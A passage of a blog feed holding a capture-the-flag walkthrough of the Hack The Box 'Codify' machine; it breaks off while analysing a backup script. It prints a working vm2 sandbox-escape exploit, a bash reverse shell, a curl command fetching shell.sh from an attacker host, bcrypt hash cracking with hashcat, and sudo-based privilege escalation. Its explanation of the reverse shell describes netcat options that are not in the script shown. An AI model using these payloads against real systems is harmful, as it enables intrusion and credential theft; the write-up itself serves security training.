term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><category term="application-control"/><summary type="html"><![CDATA[Assessing Application Control]]></summary></entry><entry><title type="html">Codify</title><link href="https://emdeh.github.io/blog/2024/codify-walkthrough/" rel="alternate" type="text/html" title="Codify"/><published>2024-01-25T14:14:00+00:00</published><updated>2024-01-25T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/codify-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/codify-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <hr/> <p>Codify presents as a moderately challenging easy box, characterised by a privilege escalation that requires a bit of knowledge of bash secure scripting.</p> <p>Initial access is obtained by web-based Node.js code editor sandbox that allows arbitrary code execution on the host. Arbitrary code is then leveraged to fetch a reverse shell and achieve remote code execution.</p> <p>From there a hash is stolen following further system enumeration. Cracking the hash enables laterally movement, and privilege escalation is achieved by exploiting a vulnerability in a custom backup script that a standard user has elevated privileges over.</p> <p>The box exemplifies the importance of secure coding practices, and the need to use strong, complex, passphrases.</p> <h2 id="methods">Methods</h2> <h3 id="sandbox-escape">Sandbox escape</h3> <p>A sandbox escape refers to an exploit in which malicious code or software breaks out of the sandbox environment in which it’s supposed to be contained. Sandboxing is a security mechanism that isolates applications, processes, or code to reduce the potential harm from a compromised system.</p> <h3 id="arbitrary-code-execution">Arbitrary code execution</h3> <p>Arbitrary code execution is a security vulnerability that occurs when an attacker gains the ability to execute any code of their choice on a target system. This type of exploit allows the attacker to run commands that the system’s designers did not intend to permit, often leading to unauthorised actions such as data theft, system compromise, or further exploitation of other vulnerabilities.</p> <p>Key aspects of arbitrary code execution include:</p> <ol> <li> <p><strong>Control Over Execution Flow:</strong> The attacker finds a way to divert the normal execution flow of a program, injecting or directing it to run unexpected code.</p> </li> <li> <p><strong>Running Unauthorised Commands:</strong> The code executed can do anything that the application’s permissions allow, depending on the system’s privileges and security controls.</p> </li> <li> <p><strong>Common Causes:</strong> It often results from vulnerabilities like buffer overflows, injection flaws, insecure deserialization, or other weaknesses that allow an attacker to inject malicious code into a process.</p> </li> <li> <p><strong>Severity:</strong> Arbitrary code execution is considered a severe security issue because it can lead to complete system takeover, data breaches, or serve as a gateway for further attacks.</p> </li> <li> <p><strong>Mitigation:</strong> Prevention includes secure coding practices, input validation, using memory-safe languages, regular security testing, and keeping systems updated with security patches.</p> </li> </ol> <h3 id="remote-code-execution">Remote code execution</h3> <p>Remote Code Execution (RCE) is a severe security vulnerability that allows an attacker to run arbitrary code on a target machine or server across a network, such as the internet, without having physical access to it. This type of vulnerability is particularly dangerous as it can be exploited remotely to gain control over another system.</p> <p>The distinction between RCE and ACE lies in the attack vector.</p> <ul> <li>RCE is specifically about remote exploitation, where the attack occurs over a network.</li> <li>ACE is a broader term that covers any situation (both local and remote) where an attacker can execute code of their choice but does not specify the method of delivery.</li> </ul> <p>In the context of this post, the arbitrary code execution relates to running commands in the codify editor that the system did not intend to allow, whereas remote code execution relates to when a reverse shell is established and execution of commands was done remotely to the system.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap">Nmap</a></li> <li><a href="https://github.com/koalaman/shellcheck">Shellcheck</a></li> <li><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li>Dictionary attack (Hashcat)</li> <li>Brute forcing (glob matching)</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration starts with Nmap scanning.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> 10.129.6.167 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-24 04:53 GMT
Nmap scan report <span class="k">for </span>10.129.6.167
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.50 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>3000</li> </ul> </li> <li>Domain name http://codify.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain http://codify.htb can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.6.167 codify.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.6.167 codify.htb
</code></pre></div></div> <p>This makes it reachable and reveals a page that purports to allow Node.js code to be tested in a sandbox environment. The site states that:</p> <blockquote> <p><em>“Codify is a simple web application that allows you to test your Node.js code easily…Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system.”</em></p> </blockquote> <p><img src="/assets/img/2024-codify/20240125-codify-webpage.png" alt="20240125-codify-webpage.png" class="auto-resize"/></p> <p>The site also lists some limitations that are in place for security of the platform. These include restricting the importation of <code class="language-plaintext highlighter-rouge">child_processes</code> and <code class="language-plaintext highlighter-rouge">fs</code> modules.</p> <p>The site goes on to say:</p> <blockquote> <p>“<em>This is to prevent users from executing arbitrary system commands, which could be a major security risk.</em>”</p> </blockquote> <p>Then lists the following modules as being available for import:</p> <ul> <li>url</li> <li>crypto</li> <li>util</li> <li>events</li> <li>assert</li> <li>stream</li> <li>path</li> <li>os</li> <li>zlib</li> </ul> <p>Another page details that the Code Editor uses the <strong>vm2</strong> library. Clicking the link leads to the <strong>3.9.16 version release of vm2</strong>.</p> <p>Researching <strong>vm2</strong> version 3.9.16 reveals a critical <strong>sandbox breakout</strong> vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2023-29199</p> <blockquote> <p>“<em>attackers (can) bypass <code class="language-plaintext highlighter-rouge">handleException()</code> and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context…</em>”</p> </blockquote> <h2 id="what-is-nodejs">What is Node.js</h2> <p>Node.js is an open-source, cross-platform JavaScript runtime environment that executes JavaScript code outside of a web browser. It’s built on Chrome’s V8 JavaScript engine and allows developers to use JavaScript to write command-line tools and for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user’s web browser.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="proof-of-concept">Proof of Concept</h2> <p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></p> <p><strong>vm2</strong> is a module in Node.js that creates isolated environments (sandboxes) to safely run untrusted JavaScript code. In <strong>version 3.9.16 of vm2</strong>, there is a security flaw in the way it processes errors or exceptions. Normally, vm2 should prevent code inside the sandbox from affecting or accessing the host system. The flaw involves a complex interaction where a custom error object can be manipulated to bypass vm2’s security checks. By exploiting this, an attacker can execute any code they want on the host system, not just within the sandbox.</p> <p>An example of how this vulnerability could be used to display the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, which is a common file in Unix-like systems that contains user account information is:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>

</code></pre></div></div> <p>In this code:</p> <ul> <li>A custom error object <code class="language-plaintext highlighter-rouge">err</code> and a <code class="language-plaintext highlighter-rouge">handler</code> are created with a method that triggers an error.</li> <li>A JavaScript feature called <code class="language-plaintext highlighter-rouge">Proxy</code> is used to intercept operations on the <code class="language-plaintext highlighter-rouge">err</code> object, specifically the <code class="language-plaintext highlighter-rouge">getPrototypeOf</code> operation, which is supposed to return an object’s prototype.</li> <li>In the <code class="language-plaintext highlighter-rouge">try...catch</code> block, the proxied error object is thrown. Due to the vulnerability, the <code class="language-plaintext highlighter-rouge">catch</code> block is manipulated to access Node.js’s core modules.</li> <li>The <code class="language-plaintext highlighter-rouge">child_process</code> module’s <code class="language-plaintext highlighter-rouge">execSync</code> function is then used to execute the <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> command, displaying the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</li> <li>This output is then logged to the console.</li> </ul> <p>Running this code in the page’s editor successfully returns the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, demonstrating the breakout and arbitrary command execution.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</code></pre></div></div> <h2 id="initial-access">Initial access</h2> <p>The objective now is to use the PoC to achieve <strong>remote code execution</strong> by manipulating the target to fetch a reverse shell.</p> <h3 id="staging">Staging</h3> <p>To achieve this a simple file containing a reverse shell can be created:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.15/4321 0&gt;&amp;1
</code></pre></div></div> <p>The command has the following components:</p> <ul> <li><code class="language-plaintext highlighter-rouge">#!/bin/bash</code> is the shebang line that tells the system this is a Bash script.</li> <li><code class="language-plaintext highlighter-rouge">nc</code> is the Netcat command.</li> <li><code class="language-plaintext highlighter-rouge">10.10.14.15</code> is the IP address where your Netcat listener is running.</li> <li><code class="language-plaintext highlighter-rouge">4321</code> is the port on which your Netcat listener is listening.</li> <li><code class="language-plaintext highlighter-rouge">-e /bin/bash</code> tells Netcat to execute the <code class="language-plaintext highlighter-rouge">/bin/bash</code> shell upon connecting. This will give the listener shell access to the system running the script.</li> </ul> <p>The file is saved as <code class="language-plaintext highlighter-rouge">shell.sh</code>.</p> <p>The file can then be served with a simple webserver:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
</code></pre></div></div> <p>The target can then be manipulated into fetching the shell by adding <code class="language-plaintext highlighter-rouge">curl http://10.10.14.15:8080/shell.sh -o shell</code> to the <code class="language-plaintext highlighter-rouge">execSync()</code> function in PoC like so:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.15:8080/shell.sh -o shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The python webserver confirms the file was successfully fetched:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="p">[</span><span class="err">★</span><span class="p">]</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">8080</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">8080</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="p">)</span> <span class="bp">...</span>
<span class="mf">10.129</span><span class="p">.</span><span class="mf">6.167</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Jan</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">05</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="sh">"</span><span class="s">GET /shell.sh HTTP/1.1</span><span class="sh">"</span> <span class="mi">200</span> <span class="o">-</span>
</code></pre></div></div> <h3 id="exploitation-1">Exploitation</h3> <p>The next step is to make the file executable by sending <code class="language-plaintext highlighter-rouge">chmod +x shell</code> in the <code class="language-plaintext highlighter-rouge">execSync()</code> function.</p> <p>Then, after starting a <code class="language-plaintext highlighter-rouge">netcat</code>listener, the shell can be executed by sending <code class="language-plaintext highlighter-rouge">bash -x shell</code> to the target:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('bash -x shell');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
</code></pre></div></div> <p>The listener successfully captures the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4321
Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 10.129.6.167.
Ncat: Connection from 10.129.6.167:44946.
sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
svc
$ 
</span></code></pre></div></div> <h3 id="upgrading-the-shell">Upgrading the shell</h3> <p>The shell can then be upgraded for interactivity using:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>

<span class="n">svc</span><span class="nd">@codify</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span> 

</code></pre></div></div> <h2 id="lateral-movement">Lateral movement</h2> <p>Exploring the site’s <code class="language-plaintext highlighter-rouge">/www</code> directory in the root <code class="language-plaintext highlighter-rouge">/var</code> directory finds a <code class="language-plaintext highlighter-rouge">tickets.db</code> file.</p> <p>Catting this file finds a hash for the user <code class="language-plaintext highlighter-rouge">joshua</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@codify:/var/www/contact<span class="nv">$ </span><span class="nb">cat </span>tickets.db
<span class="nb">cat </span>tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets <span class="o">(</span><span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT<span class="o">)</span>P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence<span class="o">(</span>name,seq<span class="o">)</span>��	tableusersusersCREATE TABLE <span class="nb">users</span> <span class="o">(</span>
        <span class="nb">id </span>INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua<span class="nv">$2a$12$SOn8Pf6z8fO</span>/nVsNbAAequ/&lt;REDACTED&gt;/p/Zw2
��
����ua  <span class="nb">users
             </span>ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to <span class="nb">set </span>this up locally? Like instead of coming to this site, can I download this and <span class="nb">set </span>it up <span class="k">in </span>my own computer? A feature like that would be nice.open� <span class="p">;</span>�wTom HanksNeed networking modulesI think it would be better <span class="k">if </span>you can implement a way to handle network-based stuff. Would <span class="nb">help </span>me out a lot. Thanks!opensvc@codify:/var/www/contact<span class="nv">$ </span>
</code></pre></div></div> <p>The hash appears to be a bcrypt hash.</p> <blockquote> <p><em>Bcrypt hashes are recognisable by their format, which usually starts with <code class="language-plaintext highlighter-rouge">$2a$</code>, <code class="language-plaintext highlighter-rouge">$2b$</code>, <code class="language-plaintext highlighter-rouge">$2x$</code>, or <code class="language-plaintext highlighter-rouge">$2y$</code> followed by a cost parameter (like <code class="language-plaintext highlighter-rouge">$12$</code> in your hash), and then the salt and hash value.</em></p> </blockquote> <p>The hash can be formatted for hashcat by dropping the username and adding it to a file (or passing it directly to the command).</p> <p>In Hashcat, the mode to use for cracking bcrypt hashes is <code class="language-plaintext highlighter-rouge">3200</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

OpenCL API <span class="o">(</span>OpenCL 1.2 LINUX<span class="o">)</span> - Platform <span class="c">#1 [Intel(R) Corporation]</span>
<span class="o">==================================================================</span>
<span class="k">*</span> Device <span class="c">#1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU</span>

OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#2 [The pocl project]</span>
<span class="o">=============================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#2: pthread-AMD EPYC 7543 32-Core Processor, skipped</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Single-Hash
<span class="k">*</span> Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span class="k">for </span>this attack: 65 MB

Dictionary cache built:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344392
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385
<span class="k">*</span> Runtime...: 1 sec

</code></pre></div></div> <p>The hash cracks</p> <p><img src="/assets/img/2024-codify/20240125-codify-hash.png" alt="20240125-codify-hash.png" class="auto-resize"/></p> <p>With the acquired password, SSH can be used to authenticate to the target as the user <strong>joshua.</strong></p> <p>And the user flag is obtained.</p> <div class="language-ssh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">└──╼</span> <span class="err">[★]$</span> <span class="k">ssh</span> joshua@10.129.6.167
<span class="k">joshua</span>@codify:~<span class="err">$</span> ls
<span class="k">user</span>.txt
<span class="k">joshua</span>@codify:~<span class="err">$</span> cat user.txt 
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation">Privilege escalation</h2> <p>A helpful check for privilege escalation is to review sudo permissions.</p> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> it can be seen that the user has sudo rights over the <code class="language-plaintext highlighter-rouge">/opt/scripts/mysql-backup.sh</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>joshua: 
Matching Defaults entries <span class="k">for </span>joshua on codify:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User joshua may run the following commands on codify:
    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/mysql-backup.sh

</code></pre></div></div> <p>As the name suggests, the script is designed to back up MySQL databases.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">DB_USER</span><span class="o">=</span><span class="s2">"root"</span>
<span class="nv">DB_PASS</span><span class="o">=</span><span class="si">$(</span>/usr/bin/cat /root/.creds<span class="si">)</span>
<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/var/backups/mysql"</span>

<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
/usr/bin/echo

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /usr/bin/echo <span class="s2">"Password confirmed!"</span>
<span class="k">else</span>
        /usr/bin/echo <span class="s2">"Password confirmation failed!"</span>
        <span class="nb">exit </span>1
<span class="k">fi</span>

/usr/bin/mkdir <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>

<span class="nv">databases</span><span class="o">=</span><span class="si">$(</span>/usr/bin/mysql <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="nt">-e</span> <span class="s2">"SHOW DATABASES;"</span> | /usr/bin/grep <span class="nt">-Ev</span> <span class="s2">"(Database|information_schema|performance_schema)"</span><span class="si">)</span>

<span class="k">for </span>db <span class="k">in</span> <span class="nv">$databases</span><span class="p">;</span> <span class="k">do</span>
    /usr/bin/echo <span class="s2">"Backing up database: </span><span class="nv">$db</span><span class="s2">"</span>
    /usr/bin/mysqldump <span class="nt">--force</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span> | /usr/bin/gzip <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz"</span>
<span class="k">done</span>

/usr/bin/echo <span class="s2">"All databases backed up successfully!"</span>
/usr/bin/echo <span class="s2">"Changing the permissions"</span>
/usr/bin/chown root:sys-adm <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/chmod 774 <span class="nt">-R</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
/usr/bin/echo <span class="s1">'Done!'</span>

</code></pre></div></div> <p>The script does the following:</p> <ol> <li><strong>Setting Variables:</strong> <ul> <li><code class="language-plaintext highlighter-rouge">DB_USER="root"</code>: Defines the database username, in this case, <code class="language-plaintext highlighter-rouge">root</code>.</li> <li><code class="language-plaintext highlighter-rouge">DB_PASS=$(/usr/bin/cat /root/.creds)</code>: Retrieves the MySQL root user’s password from a file located at <code class="language-plaintext highlighter-rouge">/root/.creds</code>.</li> </ul> </li> <li><strong>Password Confirmation:</strong> <ul> <li>The script prompts the user to enter the MySQL password for the root user. This is done securely (without echoing the input) using <code class="language-plaintext highlighter-rouge">read -s -p</code>.</li> <li>It then checks if the entered password (<code class="language-plaintext highlighter-rouge">USER_PASS</code>) matches the one stored in <code class="language-plaintext highlighter-rouge">/root/.creds</code> (<code class="language-plaintext highlighter-rouge">DB_PASS</code>). If they don’t match, the script prints an error message and exits.</li> </ul> </li> <li><strong>Creating Backup Directory:</strong> <ul> <li>The script ensures that the backup directory (<code class="language-plaintext highlighter-rouge">/var/backups/mysql</code>) exists, creating it if necessary with <code class="language-plaintext highlighter-rouge">mkdir -p</code>.</li> </ul> </li> <li><strong>Retrieving Database Names:</strong> <ul> <li>It retrieves a list of all databases (excluding <code class="language-plaintext highlighter-rouge">information_schema</code>, <code class="language-plaintext highlighter-rouge">performance_schema</code>, and the <code class="language-plaintext highlighter-rouge">Database</code> header) using a MySQL command. The list of databases is stored in the variable <code class="language-plaintext highlighter-rouge">databases</code>.</li> </ul> </li> <li><strong>Backing Up Each Database:</strong> <ul> <li>The script loops through each database in the <code class="language-plaintext highlighter-rouge">databases</code> variable.</li> <li>For each database (<code class="language-plaintext highlighter-rouge">db</code>), it performs a backup using <code class="language-plaintext highlighter-rouge">mysqldump</code> and compresses the output to a <code class="language-plaintext 